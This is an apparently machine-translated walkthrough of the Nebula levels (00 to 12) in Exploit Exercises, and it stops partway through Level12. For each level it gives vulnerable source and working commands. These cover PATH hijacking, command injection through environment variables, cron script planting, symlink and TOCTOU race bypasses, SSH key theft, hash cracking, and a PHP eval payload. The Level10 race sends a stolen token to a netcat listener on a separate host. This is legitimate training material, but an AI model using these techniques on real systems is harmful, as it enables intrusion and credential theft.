<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Exploit Exercises or another site for VulnHub lovers</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day to all, thanks for reading my raitap. Today we will talk about another site that is similar to VulnHub. This is Exploit Exercises . Despite t...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Exploit Exercises or another site for VulnHub lovers</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/273/6b2/604/2736b2604f5248ba845ab64e01cfebdd.png"><br><br>  Good day to all, thanks for reading my raitap.  Today we will talk about another site that is similar to VulnHub.  This is <a href="https://exploit-exercises.com/">Exploit Exercises</a> .  Despite the small number of virtual locks, and their relatively long publication, you can learn something new there.  Moreover, this is offset by the diversity and number of levels. <br><br>  Start proposed with a virtual machine called <a href="https://exploit-exercises.com/nebula">Nebula</a> .  We are going to analyze it today. <br><a name="habracut"></a><br>  There are a total of 20 levels on the following topics: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  SUID files </li><li>  Permissions </li><li>  Race conditions </li><li>  Shell meta-variables </li><li>  $ PATH weaknesses </li><li>  Scripting language weaknesses </li><li>  Binary compilation failures </li></ul><br>  For each level, a separate user, <i>levelXX</i> , has been <i>created</i> , and the <i>flagXX</i> user <i>whose</i> privileges must be obtained in order to execute the <i>getflag</i> command on his behalf.  Let's start! <br><br><h3>  Level00 </h3><br>  We are asked using find to find and run the <i>flag00</i> user program <i>SUID</i> . <br><br>  Are looking for: <br><br><pre><code class="bash hljs">level00@nebula:~$ find / -user flag00 2&gt;/dev/null /bin/.../flag00</code> </pre> <br>  Run: <br><br><pre> <code class="bash hljs">level00@nebula:~$ /bin/.../flag00 Congrats, now run getflag to get your flag! flag00@nebula:~$ getflag You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level01 </h3><br>  Given the source of the vulnerable application, you need to run <i>getflag</i> : <br><br><div class="spoiler">  <b class="spoiler_title">level1.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv, char **envp) { gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system("/usr/bin/env echo and now what?"); }</span></span></span></span></code> </pre> <br></div></div><br>  That's what happens when you trust <i>env</i> :) <br><br><pre> <code class="bash hljs">level01@nebula:~$ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /tmp/ level01@nebula:/tmp$ ln -s /bin/getflag <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> level01@nebula:/tmp$ PATH=/tmp:<span class="hljs-variable"><span class="hljs-variable">$PATH</span></span> level01@nebula:/tmp$ env <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> getflag is executing on a non-flag account, this doesn<span class="hljs-string"><span class="hljs-string">'t count level01@nebula:/tmp$ /home/flag01/flag01 You have successfully executed getflag on a target account</span></span></code> </pre> <br><h3>  Level02 </h3><br>  Another example of a vulnerable program that trusts environment variables: <br><br><div class="spoiler">  <b class="spoiler_title">level2.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv, char **envp) { char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(&amp;buffer, "/bin/echo %s is cool", getenv("USER")); printf("about to call system(\"%s\")\n", buffer); system(buffer); }</span></span></span></span></code> </pre> <br></div></div><br>  Just change <i>$ USER</i> : <br><br><pre> <code class="bash hljs">level02@nebula:~$ USER=<span class="hljs-string"><span class="hljs-string">"12|getflag"</span></span> level02@nebula:~$ /home/flag02/flag02 about to call system(<span class="hljs-string"><span class="hljs-string">"/bin/echo 12|getflag is cool"</span></span>) You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level03 </h3><br>  There are no sorts here, but there is a <i>crontab</i> , and dangerous permissions for the directory: <br><br><div class="spoiler">  <b class="spoiler_title">writable.sh</b> <div class="spoiler_text"><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/sh for i in /home/flag03/writable.d/* ; do (ulimit -t 5; bash -x "$i") rm -f "$i" done</span></span></code> </pre> <br></div></div><br><pre> <code class="bash hljs">level03@nebula:/home/flag03$ ls -ahl drwxrwxrwx 1 flag03 flag03 60 2017-01-12 00:30 writable.d/ -rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh* level03@nebula:/home/flag03$ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"getflag &gt;&gt; /tmp/flag"</span></span> &gt; writable.d/flag.sh</code> </pre> <br>  Some time later: <br><br><pre> <code class="bash hljs">level03@nebula:/home/flag03$ cat /tmp/flag You have successfully executed getflag on a target account</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">crontab -u flag03 -l</b> <div class="spoiler_text"><pre> <code class="bash hljs">*/3 * * * * /home/flag03/writable.sh</code> </pre> <br></div></div><br><h3>  Level04 </h3><br>  And here we are asked, using this program, to read the contents of the <i>token</i> file: <br><br><div class="spoiler">  <b class="spoiler_title">level4.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; int main(int argc, char **argv, char **envp) { char buf[1024]; int fd, rc; if(argc == 1) { printf("%s [file to read]\n", argv[0]); exit(EXIT_FAILURE); } if(strstr(argv[1], "token") != NULL) { printf("You may not access '%s'\n", argv[1]); exit(EXIT_FAILURE); } fd = open(argv[1], O_RDONLY); if(fd == -1) { err(EXIT_FAILURE, "Unable to open %s", argv[1]); } rc = read(fd, buf, sizeof(buf)); if(rc == -1) { err(EXIT_FAILURE, "Unable to read fd %d", fd); } write(1, buf, rc); }</span></span></span></span></code> </pre> <br></div></div><br><pre> <code class="bash hljs">level04@nebula:~$ ll /home/flag04 -rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04* -rw------- 1 flag04 flag04 37 2011-11-20 21:52 token</code> </pre> <br>  Since the file should not contain <i>‚Äútoken‚Äù</i> , it will not contain <i>‚Äútoken‚Äù</i> : <br><br><pre> <code class="bash hljs">level04@nebula:~$ /home/flag04/flag04 /home/flag04/flag04 [file to <span class="hljs-built_in"><span class="hljs-built_in">read</span></span>] level04@nebula:~$ /home/flag04/flag04 token You may not access <span class="hljs-string"><span class="hljs-string">'token'</span></span> level04@nebula:~$ ln -s /home/flag04/token /tmp/flag04lnk level04@nebula:~$ /home/flag04/flag04 /tmp/flag04lnk 06508b5e-8909-4f38-b630-fdb148a848a2</code> </pre> <br><h3>  Level05 </h3><br>  At this level, the wrong rights for the directory are waiting for us: <br><br><pre> <code class="bash hljs">level05@nebula:~$ ll /home/flag05/ drwxr-xr-x 2 flag05 flag05 42 2011-11-20 20:13 .backup/ -rw-r--r-- 1 flag05 flag05 220 2011-05-18 02:54 .bash_logout -rw-r--r-- 1 flag05 flag05 3353 2011-05-18 02:54 .bashrc -rw-r--r-- 1 flag05 flag05 675 2011-05-18 02:54 .profile drwx------ 2 flag05 flag05 70 2011-11-20 20:13 .ssh/</code> </pre> <br>  Backups are good, let's see what is there: <br><br><pre> <code class="bash hljs">level05@nebula:~$ ll /home/flag05/.backup/ -rw-rw-r-- 1 flag05 flag05 1826 2011-11-20 20:13 backup-19072011.tgz level05@nebula:~$ tar -xvf /home/flag05/.backup/backup-19072011.tgz .ssh/ .ssh/id_rsa.pub .ssh/id_rsa .ssh/authorized_keys</code> </pre> <br>  Excellent, private ssh-key.  Connect and execute <i>getflag</i> : <br><br><pre> <code class="bash hljs">level05@nebula:~$ ssh -i .ssh/id_rsa flag05@127.0.0.1 flag05@nebula:~$ getflag You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level06 </h3><br>  The description says about credentials from past versions of Unix. <br><br><pre> <code class="bash hljs">level06@nebula:~$ cat /etc/passwd | grep flag06 flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</code> </pre> <br>  We feed the <i>John</i> hash, which defines it as the word <i>hello</i> .  Log in and pick up the "flag": <br><br><pre> <code class="bash hljs">level06@nebula:~$ ssh flag06@127.0.0.1 flag06@nebula:~$ getflag You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level07 </h3><br>  User <i>flag07</i> wrote his first <i>Perl</i> application: <br><br><div class="spoiler">  <b class="spoiler_title">index.cgi</b> <div class="spoiler_text"><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/perl use CGI qw{param}; print "Content-type: text/html\n\n"; sub ping { $host = $_[0]; print("&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"); @output = `ping -c 3 $host 2&gt;&amp;1`; foreach $line (@output) { print "$line"; } print("&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"); } # check if Host set. if not, display normal page, etc ping(param("Host"));</span></span></code> </pre> <br></div></div><br>  Here we have no filtering parameters in the <i>$ host</i> variable.  Check the port on which it hangs: <br><br><pre> <code class="bash hljs">level07@nebula:~$ cat /home/flag07/thttpd.conf | grep port port=7007</code> </pre> <br>  And we successfully operate: <br><br><img src="https://habrastorage.org/files/957/171/c94/957171c94b0f44738cb7ff3d7229ae8f.png"><br><br><h3>  Level08 </h3><br>  We are asked to see a traffic dump and log in.  Download it to yourself: <br><br><pre> <code class="bash hljs">level08@nebula:~$ ls -lh /home/flag08 -rw-r--r-- 1 root root 8302 2011-11-20 21:22 capture.pcap $ scp level08@10.0.31.116:/home/flag08/capture.pcap ./</code> </pre> <br>  Let's see what is there: <br><br><img src="https://habrastorage.org/files/fda/105/6b7/fda1056b75aa475da28b6357febac666.png"><br><br>  It is strange that there are nonprinting characters in the password, after extracting the HEX dump of this password and some conversion, we get the following result: <br><br><pre> <code class="python hljs"><span class="hljs-number"><span class="hljs-number">62</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"b"</span></span>; <span class="hljs-number"><span class="hljs-number">61</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"a"</span></span>; <span class="hljs-number"><span class="hljs-number">63</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"c"</span></span>; <span class="hljs-number"><span class="hljs-number">6</span></span>b =&gt; <span class="hljs-string"><span class="hljs-string">"k"</span></span>; <span class="hljs-number"><span class="hljs-number">64</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"d"</span></span>; <span class="hljs-number"><span class="hljs-number">6</span></span>f =&gt; <span class="hljs-string"><span class="hljs-string">"o"</span></span>; <span class="hljs-number"><span class="hljs-number">6</span></span>f =&gt; <span class="hljs-string"><span class="hljs-string">"o"</span></span>; <span class="hljs-number"><span class="hljs-number">72</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"r"</span></span>; <span class="hljs-number"><span class="hljs-number">7</span></span>f =&gt; <span class="hljs-string"><span class="hljs-string">"."</span></span>; <span class="hljs-number"><span class="hljs-number">7</span></span>f =&gt; <span class="hljs-string"><span class="hljs-string">"."</span></span>; <span class="hljs-number"><span class="hljs-number">7</span></span>f =&gt; <span class="hljs-string"><span class="hljs-string">"."</span></span>; <span class="hljs-number"><span class="hljs-number">30</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"0"</span></span>; <span class="hljs-number"><span class="hljs-number">30</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"0"</span></span>; <span class="hljs-number"><span class="hljs-number">52</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"R"</span></span>; <span class="hljs-number"><span class="hljs-number">6</span></span>d =&gt; <span class="hljs-string"><span class="hljs-string">"m"</span></span>; <span class="hljs-number"><span class="hljs-number">38</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"8"</span></span>; <span class="hljs-number"><span class="hljs-number">7</span></span>f =&gt; <span class="hljs-string"><span class="hljs-string">"."</span></span>; <span class="hljs-number"><span class="hljs-number">61</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"a"</span></span>; <span class="hljs-number"><span class="hljs-number">74</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"t"</span></span>; <span class="hljs-number"><span class="hljs-number">65</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"e"</span></span>; <span class="hljs-number"><span class="hljs-number">0</span></span>d =&gt; <span class="hljs-string"><span class="hljs-string">"."</span></span></code> </pre> <br>  Google quickly suggested that <i>xterm</i> uses byte <i>0x7f</i> as a <i>backspace</i> .  Thus the password: <i>backd00Rmate</i> . <br><br>  <i>Connect</i> and run <i>getflag</i> : <br><br><pre> <code class="bash hljs">$ ssh 10.0.31.116 -l flag08 flag08@nebula:~$ getflag You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level09 </h3><br>  We have access to the <i>SUID</i> <i>C</i> wrapper for the vulnerable <i>PHP</i> script: <br><br><div class="spoiler">  <b class="spoiler_title">level9.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spam</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($email)</span></span></span><span class="hljs-function"> </span></span>{ $email = preg_replace(<span class="hljs-string"><span class="hljs-string">"/\./"</span></span>, <span class="hljs-string"><span class="hljs-string">" dot "</span></span>, $email); $email = preg_replace(<span class="hljs-string"><span class="hljs-string">"/@/"</span></span>, <span class="hljs-string"><span class="hljs-string">" AT "</span></span>, $email); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $email; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">markup</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($filename, $use_me)</span></span></span><span class="hljs-function"> </span></span>{ $contents = file_get_contents($filename); $contents = preg_replace(<span class="hljs-string"><span class="hljs-string">"/(\[email (.*)\])/e"</span></span>, <span class="hljs-string"><span class="hljs-string">"spam(\"\\2\")"</span></span>, $contents); $contents = preg_replace(<span class="hljs-string"><span class="hljs-string">"/\[/"</span></span>, <span class="hljs-string"><span class="hljs-string">"&lt;"</span></span>, $contents); $contents = preg_replace(<span class="hljs-string"><span class="hljs-string">"/\]/"</span></span>, <span class="hljs-string"><span class="hljs-string">"&gt;"</span></span>, $contents); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $contents; } $output = markup($argv[<span class="hljs-number"><span class="hljs-number">1</span></span>], $argv[<span class="hljs-number"><span class="hljs-number">2</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $output; <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br></div></div><br>  Line <b>$ contents = preg_replace ("/ (\ [email (. *) \]) / E", "spam (\" \\ 2 \ ")", $ contents);</b>  quite interesting: <br><br><ol><li>  If the content matches the regular expression: <i>"/ (\ [email (. *) \]) /"</i> ; </li><li>  It is replaced by the <i>spam</i> function, which takes a value in parentheses as an argument.  And then executed </li></ol><br>  We can send any team: <br><br><pre> <code class="bash hljs">level09@nebula:~$ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[email {${system($use_me)}}]'</span></span> &gt; /tmp/<span class="hljs-built_in"><span class="hljs-built_in">eval</span></span> level09@nebula:~$ /home/flag09/flag09 /tmp/<span class="hljs-built_in"><span class="hljs-built_in">eval</span></span> getflag You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level10 </h3><br>  A program that relies on <i>access ()</i> sends any file over the network: <br><br><div class="spoiler">  <b class="spoiler_title">basic.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; #include &lt;errno.h&gt; #include &lt;sys/socket.h&gt; #include &lt;netinet/in.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char *file; char *host; if(argc &lt; 3) { printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf("Connecting to %s:18211 .. ", host); fflush(stdout); fd = socket(AF_INET, SOCK_STREAM, 0); memset(&amp;sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = inet_addr(host); sin.sin_port = htons(18211); if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) { printf("Unable to connect to host %s\n", host); exit(EXIT_FAILURE); } #define HITHERE ".oO Oo.\n" if(write(fd, HITHERE, strlen(HITHERE)) == -1) { printf("Unable to write banner to host %s\n", host); exit(EXIT_FAILURE); } #undef HITHERE printf("Connected!\nSending file .. "); fflush(stdout); ffd = open(file, O_RDONLY); if(ffd == -1) { printf("Damn. Unable to open file\n"); exit(EXIT_FAILURE); } rc = read(ffd, buffer, sizeof(buffer)); if(rc == -1) { printf("Unable to read from file: %s\n", strerror(errno)); exit(EXIT_FAILURE); } write(fd, buffer, rc); printf("wrote file!\n"); } else { printf("You don't have access to %s\n", file); } }</span></span></span></span></code> </pre> <br></div></div><br>  The idea is simple, since the access to the requested file is first checked, and only then it is sent, using links, you need to catch the moment when: <br><br><ol><li>  The link will point to the file to which you have access; </li><li>  access () will check this file; </li><li>  The link will change to a file for which we do not have access; </li><li>  The program will send it to us successfully. </li></ol><br>  We realize it.  Cycle change links: <br><br><pre> <code class="bash hljs">level10@nebula:/tmp$ <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"token"</span></span> &gt; /tmp/token level10@nebula:/tmp$ <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> ln -sf /home/flag10/token flag10; ln -sf /tmp/token flag10; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span></code> </pre> <br>  In another window, run a loop that will send the file by reference: <br><br><pre> <code class="bash hljs">level10@nebula:~$ <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> /home/flag10/flag10 /tmp/flag10 10.0.31.183; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span></code> </pre> <br>  We run <i>nc</i> to listen to the port and output the received data: <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> nc -l -p 18211 &gt; flag10; cat flag10 | grep -v token | grep -v <span class="hljs-string"><span class="hljs-string">".oO Oo."</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span></code> </pre> <br>  And almost immediately we get a token: <br><br><blockquote>  token = 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27 </blockquote><br>  Using it as a password, we log in as user <i>flag10</i> : <br><br><pre> <code class="bash hljs">level10@nebula:/tmp$ ssh flag10@localhost flag10@nebula:~$ getflag You have successfully executed getflag on a target account</code> </pre> <br><h3>  Level11 </h3><br>  There is a program that reads <i>STDIN</i> and executes it: <br><br><div class="spoiler">  <b class="spoiler_title">level11.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/mman.h&gt; /* * Return a random, non predictable file, and return the file descriptor for it. */ int getrand(char **path) { char *tmp; int pid; int fd; srandom(time(NULL)); tmp = getenv("TEMP"); pid = getpid(); asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 'A' + (random() % 26), '0' + (random() % 10), 'a' + (random() % 26), 'A' + (random() % 26), '0' + (random() % 10), 'a' + (random() % 26)); fd = open(*path, O_CREAT|O_RDWR, 0600); unlink(*path); return fd; } void process(char *buffer, int length) { unsigned int key; int i; key = length &amp; 0xff; for(i = 0; i &lt; length; i++) { buffer[i] ^= key; key -= buffer[i]; } system(buffer); } #define CL "Content-Length: " int main(int argc, char **argv) { char line[256]; char buf[1024]; char *mem; int length; int fd; char *path; if(fgets(line, sizeof(line), stdin) == NULL) { errx(1, "reading from stdin"); } if(strncmp(line, CL, strlen(CL)) != 0) { errx(1, "invalid header"); } length = atoi(line + strlen(CL)); if(length &lt; sizeof(buf)) { if(fread(buf, length, 1, stdin) != length) { err(1, "fread length"); } process(buf, length); } else { int blue = length; int pink; fd = getrand(&amp;path); while(blue &gt; 0) { printf("blue = %d, length = %d, ", blue, length); pink = fread(buf, 1, sizeof(buf), stdin); printf("pink = %d\n", pink); if(pink &lt;= 0) { err(1, "fread fail(blue = %d, length = %d)", blue, length); } write(fd, buf, pink); blue -= pink; } mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0); if(mem == MAP_FAILED) { err(1, "mmap"); } process(mem, length); } }</span></span></span></span></code> </pre> <br></div></div><br>  But not everything is so simple.  The authors write what they have, 2 solutions, but as it turned out later both do not work.  But first things first: <br><br>  First we are asked to specify the number of bytes to be sent, and then, depending on this number, the string is either immediately transferred to the <i>process</i> function, or the data is first copied into memory. <br><br>  The function <i>process</i> , <i>XOR</i> 'it them and then gives it to the <i>system</i> .  Therefore, we need to send a string that will already be processed by the <i>XOR</i> 'th: <br><br><div class="spoiler">  <b class="spoiler_title">flag11.py</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python cmd = "/bin/getflag\x00" length = 1024 key = length &amp; 0xff enc = '' for i in range(len(cmd)): char_byte = ord(cmd[i]) ^ key enc += chr(char_byte &amp; 0xff) key = (key - ord(cmd[i])) &amp; 0xff if length != len(cmd): junk = "A" * (length - len(cmd)) print( "Content-Length: %d\n%s%s" %(length, enc, junk) ) else: print( "Content-Length: %d\n%s" %(length, enc) )</span></span></code> </pre> <br></div></div><br>  We start and nothing: <br><br><pre> <code class="bash hljs">level11@nebula:~$ <span class="hljs-built_in"><span class="hljs-built_in">export</span></span> TEMP=/tmp level11@nebula:~$ python /tmp/flag11.py | /home/flag11/flag11 blue = 1024, length = 1024, pink = 1024 getflag is executing on a non-flag account, this doesn<span class="hljs-string"><span class="hljs-string">'t count</span></span></code> </pre> <br>  In the <a href="https://www.opennet.ru/cgi-bin/opennet/man.cgi%3Ftopic%3Dsystem">documentation</a> for the <i>system</i> function, we find this: <br><br><blockquote>  Do not use system () in programs with suid or sgid privileges, because some values ‚Äã‚Äãof environment variables can cause system crashes.  Instead, it is recommended to use the exec (3) family of functions, but not execlp (3) or execvp (3).  system () does not function correctly in programs with suid or sgid privileges on those systems where / bin / sh is replaced by bash version 2, since bash 2 resets its permissions on startup.  Debian uses a modified bash that does not perform this action when it starts up, just like sh does. </blockquote><br>  Bash let everyone down: <br><br><pre> <code class="bash hljs">level11@nebula:/home/flag11$ ll /bin/sh lrwxrwxrwx 1 root root 9 2011-11-20 20:38 /bin/sh -&gt; /bin/bash*</code> </pre> <br>  <i>PS By checking it on a separately compiled binary, we get the same thing.</i>  <i>Google did not give any results, apparently the authors updated bash, and forgot to update the task ...</i> <br><br><h3>  Level12 </h3><br>  As stated in the description: backdoor on port 50001.  Hmm, let's see: <br><br><div class="spoiler">  <b class="spoiler_title">level12.lua</b> <div class="spoiler_text"><pre> <code class="lua hljs"><span class="hljs-keyword"><span class="hljs-keyword">local</span></span> socket = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"socket"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> server = <span class="hljs-built_in"><span class="hljs-built_in">assert</span></span>(socket.bind(<span class="hljs-string"><span class="hljs-string">"127.0.0.1"</span></span>, <span class="hljs-number"><span class="hljs-number">50001</span></span>)) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">hash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(password)</span></span></span></span> prog = <span class="hljs-built_in"><span class="hljs-built_in">io</span></span>.<span class="hljs-built_in"><span class="hljs-built_in">popen</span></span>(<span class="hljs-string"><span class="hljs-string">"echo "</span></span>..password..<span class="hljs-string"><span class="hljs-string">" | sha1sum"</span></span>, <span class="hljs-string"><span class="hljs-string">"r"</span></span>) data = prog:<span class="hljs-built_in"><span class="hljs-built_in">read</span></span>(<span class="hljs-string"><span class="hljs-string">"*all"</span></span>) prog:<span class="hljs-built_in"><span class="hljs-built_in">close</span></span>() data = <span class="hljs-built_in"><span class="hljs-built_in">string</span></span>.<span class="hljs-built_in"><span class="hljs-built_in">sub</span></span>(data, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">40</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> data <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> client = server:accept() client:send(<span class="hljs-string"><span class="hljs-string">"Password: "</span></span>) client:settimeout(<span class="hljs-number"><span class="hljs-number">60</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> line, err = client:receive() <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> err <span class="hljs-keyword"><span 